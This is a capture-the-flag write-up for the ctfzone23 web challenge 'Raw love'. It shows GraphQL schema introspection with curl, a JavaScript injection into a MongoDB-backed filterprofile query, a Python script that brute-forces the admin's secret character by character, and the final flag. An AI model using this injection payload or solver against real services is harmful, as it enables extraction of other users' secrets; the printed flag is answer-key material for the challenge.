---
title: "ctfzone23 web/Raw love"
publishDate: "13 Aug 2023"
description: "Author: cpp.dog"
tags: ["web", "ctfzone23"]
---

#### Description
Very soon we will update the functionality, we are already working on its security, so that no one would steal my secret. In the meantime, come have fun!

\- Admin

#### Code inspection

Here's the most important code of our challenge.

`/static/js/FillForm.jsx`
```js
const response = await axios.post('/api', {
  query: `
    mutation ($description: String, $contact: String) {
      fill_form(description: $description, contact: $contact) {
        status
      }
    }
  `,
  variables: { description, contact }
},{
  headers: {
    Authorization: `Bearer ${token}`
  },
});
```

Since we have found GraphQL endpoint, let's take a look at its schema.

```bash
curl -X POST -d '{
    "query": "{__schema{types{name,fields{name}}}}"
  }' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  https://raw-love.ctfz.one/api/
```

```json
{
    "name": "Query",
    "fields": [
        {
            "name": "profile"
        },
        {
            "name": "filterprofile"
        },
        {
            "name": "like"
        },
        {
            "name": "myprofile"
        }
    ]
}
```

What is `filterprofile` query? It is not used inside sources. Let's get its arguments.

```bash
curl -X POST -d '{
    "query": "fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}"
  }' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  https://raw-love.ctfz.one/api/
```

```json
{
    "name": "filterprofile",
    "description": null,
    "args": [
        {
            "name": "description",
            "description": null,
            "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
            },
            "defaultValue": null
        }
    ],
    "type": {
        "kind": "LIST",
        "name": null,
        "ofType": {
            "kind": "OBJECT",
            "name": "Profile",
            "ofType": null
        }
    },
    "isDeprecated": false,
    "deprecationReason": null
}
```

Let's test this request with the `description` argument equal to the administrator's description.

```bash
curl -X POST -d '{"query":"query { filterprofile(description:\"Administrator\") { username } }"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  https://raw-love.ctfz.one/api/
```

```json
{
    "data": {
        "filterprofile": [
          {
            "user": "Admin"
          }
        ]
    }
}
```

So it returns users by their description. Let's try passing the character `'`.

```json
{
    "data": {
        "filterprofile": null
    }
}
```

We found the injection! The server appears to be using MongoDB, so we need a payload that looks something like this:
```js
;return (this.secret.substr(0, 8) == 'ctfzone{'; var _ = '
```

#### Solver code
```py
import requests

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
flag ="ctfzone{"
while True:
    for char in charset:
        temp_flag = flag + char
        print(f'trying {temp_flag}')
        data = requests.post("https://raw-love.ctfz.one/api/", json={
"query": """
query { 
  filterprofile(description:\"%s\") { 
    username 
    description 
    contact 
    id
    photo 
  } 
}
""" % f"Administrator'; return (this.secret.substr(0, {len(temp_flag)}) == '{temp_flag}'); var abcds='1"
          }, headers={
              "Authorization": "Bearer [REDACTED]",
              "Content-Type": "application/json",
          })
        
        if '"username":"Admin",' in data.text:
            flag = flag + char 
            print(flag)
```

#### Flag
`ctfzone{rM7_E_EFBBxkkli4Tk9a}`